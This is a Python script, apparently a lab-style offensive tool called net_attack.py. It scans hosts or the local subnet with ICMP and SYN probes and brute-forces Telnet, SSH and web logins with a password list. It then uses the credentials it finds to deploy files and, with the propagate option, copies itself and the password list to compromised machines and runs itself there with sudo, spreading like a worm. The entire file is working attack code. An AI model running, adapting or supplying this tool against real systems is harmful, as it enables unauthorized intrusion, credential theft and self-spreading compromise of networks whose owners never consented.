#!/usr/bin/python3

from scapy.all import *
import sys
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy
import requests
import os, subprocess
import base64

# Argument Parser
# -t -> Filename for a file containing a list of IP addresses
# -L -> local scan
# -p -> Ports to scan on the target host
# -u -> A username
# -f -> Filename for a file containing a list of passwords
# -d -> file to deploy on target machine
# -P -> propagate
def parse_args(args):
	options = {'ip_list_file': "", 'ports_list': list(), 'username': "", 'password_list_file': "", "file_to_deploy": "", "local_scan": False, "propagate": False}
	try:
		if len(args) > 7 and len(args) < 12:
			# -L and -t cannot be mentioned together
			if "-L" in args and "-t" in args:
				print("[!] Please specify either the Local Scan or filename containing list of IPs, not both.\n")
				help()
			elif "-L" in args:
				options['local_scan'] = True
			elif "-t" in args:
				options['ip_list_file'] = args[args.index("-t") + 1]

			# -P and -d cannot be mentioned together
			if "-P" in args and "-d" in args:
				print("[!] Please specify either the Propagate option or the file to be deployed, not both.\n")
				help()
			elif "-P" in args:
				options['propagate'] = True
			elif "-d" in args:
				options['file_to_deploy'] = args[args.index("-d") + 1]

			options['ports_list'] = args[args.index("-p") + 1].split(",")
			options['username'] = args[args.index("-u") + 1]
			options['password_list_file'] = args[args.index("-f") + 1]

		else:
			print("[!] ERROR: Please provide the arguments correctly. Refer to the help section below.\n")
			help()
	except Exception as e:
		print("ERROR:", type(e), e)
		print("Please refer to the Help Section below\n")
		help()
	return options

# Help Menu
def help():
	print("===== HELP MENU =====")
	print("Description:")
	print("\tThe net_attack.py script will automate the process of discovering weak usernames and passwords being used for services running on a host and can be used for lateral movement through the network using SSH and Telnet if weakness is found.")
	print("Usage:")
	print("\t ./net_attack.py -t [ip_address_list_file] -p [comma_separated_ports_to_scan] -u [username] -f [password_list_file] (-d [file_to_deply])")
	print("\t ./net_attack.py -L -p [comma_separated_ports_to_scan] -u [username] -f [password_list_file] -P")
	print("Switches:")
	print("\t-t -> Filename for a file containing a list of IP addresses")
	print("\t      (Cannot be used with -L)")
	print("\t-p -> Ports to scan on the target host")
	print("\t-u -> A username")
	print("\t-f -> Filename for a file containing a list of passwords")
	print()
	print("\t Optional Switches:")
	print("\t -d -> File to deploy on target machine, when weak username password is found")
	print("\t       (Cannot be used with -P)")
	print("\t -L -> to scan the local networks")
	print("\t      (Cannot be used with -t)")
	print("\t -P -> to propagate the net_attack script and passwords file")
	print("\t       (Cannot be used with -d)")
	print("Examples:")
	print("\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
	print("\t./net_attack.py -t ip_list.txt -p 22 -u root -f passwords.txt")
	print("\t./net_attack.py -t ip_list.txt -p 22 -u root -f passwords.txt -d file_to_deploy.txt")
	print("\t./net_attack.py -L -p 22 -u root -f passwords.txt -P")
	exit()

# Function to read any file having data on different lines and return the data as a list
def file_to_list(filename):
	f = open(filename, "r")
	line_list = f.readlines()
	for i in range(0, len(line_list)):
		line_list[i] = line_list[i].strip()
	return line_list

#  Function to read the list of IP addresses from the file named 'filename'
def read_ip_list(filename):
	print("Reading list of IP addresses from file " + filename + "...")
	ip_list = file_to_list(filename)
	return ip_list

# Function to check connectivity of the host with IP address 'ip'
def is_reachable(ip):
	print("Checking connectivity for IP: " + ip)
	try:
		# Sending out the ICMP request packet to check connectivity with timeout of 1 second and verbosity set to 0 to avoid text clutter
		ip_packet = sr1(IP(dst=ip)/ICMP(), timeout=1, verbose=0)

		# Checking whether an ICMP response is received
		if(ip_packet != None and 'ICMP' in ip_packet and ip_packet[ICMP].type == 0):
			return True
		else:
			return False
	except Exception as e:
		print("IP check error", e, type(e))
		return False

# Get Default Known Port's Service
def get_port_service(port):
	try:
		service = {
		  21: "FTP",
		  22: "SSH",
		  23: "Telnet",
		  80: "HTTP",
		  443: "HTTPS",
		  8080: "HTTP alt",
		  8000: "HTTP alt"
		}[port]
		return service
	except KeyError:
		return "?"

# Port Scanning Function
def scan_port(ip, port):
	# Crafting SYN packet
	ip_hdr = IP(dst=ip)
	tcp_hdr = TCP(dport=port, flags="S")
	port_scan_packet = ip_hdr/tcp_hdr
	resp, unans = sr(port_scan_packet, timeout=2, verbose=0)
	# If response flag contains SYN-ACK, then the port is open
	if((len(resp) > 0) and (resp[0][1][TCP].flags == "SA")):
		return True
	else:
 		return False

# Function to get the filename to be transferred along with the local and remote file paths
def get_filename_filepaths(ip, file_to_deploy):
	# Incase user provides relative path, we need to extract the file name
	filename = file_to_deploy.rsplit("/", 1)[-1]
	local_filepath = os.path.dirname(os.path.realpath(file_to_deploy)) +  "/"
	remote_filepath = "/home/ubuntu/" + ip + "/"
	return filename, local_filepath, remote_filepath

# Encode in Ascii Function
def enc(s):
	return s.encode("utf-8")

# Bruteforcing Telnet Function
def bruteforce_telnet(ip, port, username, password_list_filename):
	# Getting the list of passwords from the passwords file
	password_list = file_to_list(password_list_filename)
	for password in password_list:
		tel_client = Telnet(ip, port)
		tel_client.read_until(enc("login:"))
		tel_client.write(enc(username+"\n"))
		tel_client.read_until(enc("Password:"))
		tel_client.write(enc(password+"\n"))

		# Checking for successful login based on the output 
		output = tel_client.read_until(enc("Welcome to"), timeout=1).decode("utf-8")
		if "Welcome to" in output:
			tel_client.write(enc("exit\n"))
			# Without reading all the tel_client output contents, the telnet commands dont run
			output = tel_client.read_all().decode("ascii")
			return username + ":" + password
		else:
			continue
	return ""

# Telnet file transfer and propagate function
def telnet_filetransfer_or_propagate(ip, port, telnet_userpass, file_to_deploy, propagate):
	username = telnet_userpass.split(":")[0]
	password = telnet_userpass.split(":")[1]
	tel_client = Telnet(ip, port)
	tel_client.read_until(enc("login: "))
	tel_client.write(enc(username+"\n"))
	tel_client.read_until(enc("Password: "))
	tel_client.write(enc(password+"\n"))

	# Get the name of the file to be transferred and also the local and remote file paths
	filename, local_filepath, remote_filepath = get_filename_filepaths(ip, file_to_deploy)
	#remote_filename = ip + "_telnet_" + filename
	#remote_filename = ip + "_" + filename
	remote_filename = filename

	# To check if the victim IP directory (/home/ubuntu/[IP]/) exists
	tel_client.write(enc("ls " + remote_filepath + "\n"))
	folder_exist_check = tel_client.read_until(enc("No such file or directory"), timeout=1).decode('ascii')
	if "No such file or directory" in folder_exist_check:
		tel_client.write(enc("mkdir " + remote_filepath + "\n"))

	# To check if the file already exists in target directory
	tel_client.write(enc("ls " + remote_filepath+remote_filename + "\n"))
	file_exist_check = tel_client.read_until(enc("No such file or directory"), timeout=1).decode('ascii')

	if "No such file or directory" in file_exist_check:
		# Read contents of the local file to be transferred over the network and encode them using base64 to avoid issue with strings and escape characters
		try:
			f1 = open(local_filepath+filename, "r")
			file_contents = f1.read()
			f1.close()

			tel_client.read_until(enc(":~$")).decode('ascii')
			command = "echo -n $\'" + base64.b64encode(file_contents.encode("ascii")).decode("ascii") + "\' > tempfile \n"
		# Exception to read binary files
		except UnicodeDecodeError as e:
			f1 = open(local_filepath+filename, "rb")
			file_contents = f1.read()
			f1.close()

			tel_client.read_until(enc(":~$")).decode('ascii')
			command = "echo -n $\'" + base64.b64encode(file_contents).decode("ascii") + "\' > tempfile \n"

		# Using read_until multiple times below, since read_all gets stuck if a looong command is executed, probably because it has to read a lot of data then
		tel_client.write(enc(command))
		tel_client.read_until(enc(":~$")).decode('ascii')
		# Decode the base64 contents from tempfile, write to remote path and then delete the temp file
		tel_client.write(enc("cat tempfile | base64 -d > \'" + remote_filepath+remote_filename + "\'\n"))
		tel_client.read_until(enc(":~$")).decode('ascii')
		tel_client.write(enc("rm tempfile\n"))
		tel_client.read_until(enc(":~$")).decode('ascii')

		# If propagation is needed, we have sent the net_attack script as file_to_deply parameter in the main function, after which the passwords.txt file needs to be sent
		if propagate == True and file_to_deploy == os.path.basename(__file__): #"net_attack.py"
			# Transferring the passwords file after the net_attack script is sent
			telnet_filetransfer_or_propagate(ip, port, telnet_userpass, 'passwords.txt', propagate)
			print("\t\t\t[+] Attempting propagation...")
			# Change directory to the remote_filepath to execute commands from there 
			tel_client.write(enc("cd " + remote_filepath + "\n"))
			tel_client.read_until(enc("$")).decode('ascii')
			# Make the script executable and running it with sudo permissions
			tel_client.write(enc("chmod +x " + remote_filepath + "net_attack.py\n"))
			tel_client.read_until(enc("$")).decode('ascii')
			propagate_command =  "echo " + password + " | sudo -S " + remote_filepath + "net_attack.py -L -P -f " + remote_filepath + "passwords.txt -u ubuntu -p 22,23\n"
			tel_client.write(enc(propagate_command))
			print("\t\t\tPropagation ongoing... (List the home directory folders to check the progress)")
		# If only file deploy switch is used and not propagation, then display the successful transfer message to the user
		elif propagate == False:
			print("\t\t\tFile \'" + filename + "\' successfully transferred to path " + remote_filepath+remote_filename)

	else:
		print("\t\t\tFile \'" + filename + "\' already exists in target directory " + remote_filepath)

	tel_client.write(enc("exit\n"))
	# Without reading all the output, the commands aren't executed in telnet
	output = tel_client.read_all().decode("ascii")
	#print(output)

	if propagate == True and file_to_deploy == os.path.basename(__file__): #"net_attack.py"
		print("\t\t\tPropagation complete!")

# Bruteforcing SSH Function
def bruteforce_ssh(ip, port, username, password_list_filename):
	# Get list of passwords from the passwords file
	password_list = file_to_list(password_list_filename)
	for password in password_list:
		# SSH connection code
		ssh_client = SSHClient()
		ssh_client.set_missing_host_key_policy(AutoAddPolicy())
		try:
			ssh_client.connect(ip, username=username, password=password)
		except Exception as e:
			#print(e, type(e))
			ssh_client.close()
			continue
		ssh_client.close()
		return username + ":" + password
	return ""

# SSH file transfer and propagate function
def ssh_filetransfer_or_propagate(ip, port, ssh_userpass, file_to_deploy, propagate):
	username = ssh_userpass.split(":")[0]
	password = ssh_userpass.split(":")[1]
	ssh_client = SSHClient()
	ssh_client.set_missing_host_key_policy(AutoAddPolicy())
	ssh_client.connect(ip, username=username, password=password)

	# Get the name of the file to be transferred and also the local and remote file paths
	filename, local_filepath, remote_filepath = get_filename_filepaths(ip, file_to_deploy)
	#remote_filename = ip + "_ssh_" + filename
	#remote_filename = ip + "_" + filename
	remote_filename = filename

	# To check if victim IP directory (/home/ubuntu[IP]) exists
	stdin, stdout, stderr = ssh_client.exec_command("ls " + remote_filepath)
	if stderr.read().decode("utf-8").strip() != "":
		ssh_client.exec_command("mkdir " + remote_filepath)

	# To check if the file already exists in the remote directory
	stdin, stdout, stderr = ssh_client.exec_command("ls " + remote_filepath+remote_filename)

	# If an error exists i.e. 'No such file or directory', then transfer the file
	if stderr.read().decode("utf-8").strip() != "":
		# File transfer using SFTP client within SSH
		try:
			sftp_client = ssh_client.open_sftp()
			sftp_client.put(local_filepath + filename, remote_filepath + remote_filename)
			sftp_client.close()

		except Exception as e:
			print("\'" + filename + "\' file transfer unsuccessful :(", e, type(e))
		# If propagation is needed, we have sent the net_attack script as file_to_deply parameter in the main function, after which the passwords.txt file needs to be sent
		if propagate == True and file_to_deploy == os.path.basename(__file__): #"net_attack.py"
			# Transferring the passwords file after the net_attack script is sent
			ssh_filetransfer_or_propagate(ip, port, ssh_userpass, 'passwords.txt', propagate)
			print("\t\t\t[+] Attempting propagation... (List the home directory folders to check the progress)")
			# Change directory to the remote_filepath to execute commands from there
			propagate_command = "cd " + remote_filepath
			# Make the script executable and running it with sudo permissions
			propagate_command += "; chmod +x " + remote_filepath + " net_attack.py"
			propagate_command += "; echo " + password + " | sudo -S " + remote_filepath + "net_attack.py -L -P -u ubuntu -p 23,22 -f " + remote_filepath + "passwords.txt"

			stdin, stdout, stderr = ssh_client.exec_command(propagate_command)
			# Without reading the stdout output, the file exists diplaying the "Propagation complete" message below
			stdout.read()

		# If only file deploy switch is used and not propagation, then display the successful transfer message to the user
		elif propagate == False:
			print("\t\t\tFile \'" + filename + "\' successfully transferred to path " + remote_filepath+remote_filename)

	else:
		print("\t\t\tFile \'" + filename + "\' already exists in target directory " + remote_filepath)
	ssh_client.close()
	if propagate == True and file_to_deploy == os.path.basename(__file__):
		print("\t\t\tPropagation complete!")

# Bruteforcing Web Login Function
def bruteforce_web(ip, port, username, password_list_filename):
	# Getting list of passwords from passwords file
	password_list = file_to_list(password_list_filename)
	data = {}
	data["username"] = username
	url = "http://" + ip + ":" + str(port)
	try:
		# First get the URL of the server,
		# if status code is 200, get the login page,
		# if status code is 200, send POST data including username and password,
		# if status code is 200 and the html page includes "Welcome" then login successful and return the username password.
		get_resp = requests.get(url, timeout=5)
		if get_resp.status_code == 200:
			get_login_resp = requests.get(url + "/login.php")
			if get_login_resp.status_code == 200:
				for password in password_list:
					data["password"] = password
					post_login_resp = requests.post(url + "/login.php", data)
					if post_login_resp.status_code == 200 and "<body><h1>Welcome" in post_login_resp.text:
						return username + ":" + password
					else:
						continue
				return ""
			else:
				print("\t\t\tNo login page found.")
				return ""
		else:
			print("\t\t\tHTTP OK response missing, Status code received is " + get_resp.status_code)
			return ""
	except:
		return ""



# Main function
def main():
	# ARGUMENT PARSING SECTION
	args = sys.argv
	# Saving the arguments parsed in a dictionary named 'options'
	options = dict()
	options = parse_args(args)

	# GET LIST OF IPs SECTION
	ip_list = list()
	# Condition where IP list file is provided
	if options['ip_list_file'] != "":
		# Read IP list file and save the list of IPs
		ip_list = read_ip_list(options['ip_list_file'])
	# Condition where local scan is to be performed and propagation is needed
	elif options['local_scan'] == True:
		interface_list = get_if_list()
		# Removing loopback interface
		interface_list.remove('lo')
        #print(interface_list)
		for inface in interface_list:
			inface_ip = get_if_addr(inface)
			# Getting the first 3 octets of the interface network
			network_start_octets = inface_ip.rsplit(".", 1)[0]
			# Generating IPs in the network assuming the subnet is /24
			for last_octet in range(1, 10):
				ip = ".".join([network_start_octets, str(last_octet)])
				ip_list.append(ip)

	# Need to create a copy so that indexing continues smoothly while deleting non-reachable IPs from the list of IPs
	reachable_ip_list = list(ip_list)
	# Logic to remove IPs from list if they are not reachable
	for ip in ip_list:
		# In case of duplicates in the ip_list, when an unreachable duplicate IP comes again, it would have already been removed from reachable_ip_list
		if ip in reachable_ip_list:
			if is_reachable(ip) == False:
				reachable_ip_list.remove(ip)

	# To remove attacker IP from list of reachable IPs, when this script is run by another IP through propagation
	if "10.0.0.1" in reachable_ip_list:
		reachable_ip_list.remove("10.0.0.1")

	# To print the list of final reachable IPs
	print("\nReachable IPs: ")
	print("-" * 14)
	for ip in reachable_ip_list:
		print(ip, end=" ")
	print()


	if reachable_ip_list == []:
		print("No reachable IP found from the list provided. Exiting...")
		exit()
	# PORT SCAN SECTION
	else:
		print("\nPort scan and Attack Chain Summary:")
		print("-" * 35)
		port_list = [int(port) for port in options['ports_list']]
		# Iterating through every reachable IP
		for ip in reachable_ip_list:
			print(ip)
			# Iterating through every port
			for port in port_list:
				# When Open Port is found
				if (scan_port(ip, port) == True):
					print("\t" + str(port) + "\tOPEN\t" + get_port_service(port))
					# For port 23, first step is bruteforce
					if port == 23:
						# Bruteforcing
						print("\t\t\t[+] Bruteforcing telnet login...")
						telnet_userpass = bruteforce_telnet(ip, port, options['username'], options['password_list_file'])
						if telnet_userpass != "":
							print("\t\t\tTelnet login bruteforce successful! -> " + telnet_userpass)
							# If successful, check for file to deploy
							if options['file_to_deploy'] != "":
								print("\t\t\t[+] Attempting file transfer through telnet...")
								telnet_filetransfer_or_propagate(ip, port, telnet_userpass, options['file_to_deploy'], options['propagate'])
							# Or propagation
							elif options['propagate'] == True:
								telnet_filetransfer_or_propagate(ip, port, telnet_userpass, os.path.basename(__file__), options['propagate'])
						else:
							print("\t\t\tTelnet login bruteforce failed :(")
					# For port 22, first step is bruteforce
					elif port == 22:
						# Bruteforcing
						print("\t\t\t[+] Bruteforcing SSH login...")
						ssh_userpass = bruteforce_ssh(ip, port, options['username'], options['password_list_file'])
						if ssh_userpass != "":
							print("\t\t\tSSH login bruteforce successful! -> " + ssh_userpass)
							# If successful, check for file to deploy
							if options['file_to_deploy'] != "":
								print("\t\t\t[+] Attempting file transfer through SSH...")
								ssh_filetransfer_or_propagate(ip, port, ssh_userpass, options['file_to_deploy'], options['propagate'])
							# Or propagation
							elif options['propagate'] == True:
								ssh_filetransfer_or_propagate(ip, port, ssh_userpass, os.path.basename(__file__), options['propagate'])
						else:
							print("\t\t\tSSH login bruteforce failed :(")
					# For web service ports, we only attempt bruteforce
					elif (port == 80 or port == 8080 or port == 8888):
						print("\t\t\tBruteforcing web login...")
						web_userpass = bruteforce_web(ip, port, options['username'], options['password_list_file'])
						if web_userpass != "":
							print("\r\t\t\tWeb login bruteforce successful! -> " + web_userpass)
						else:
							print("\r\t\t\tWeb login bruteforce failed :(")
				else:
					print("\t" + str(port) + "\tCLOSED")
			print("-" * 70)

main()
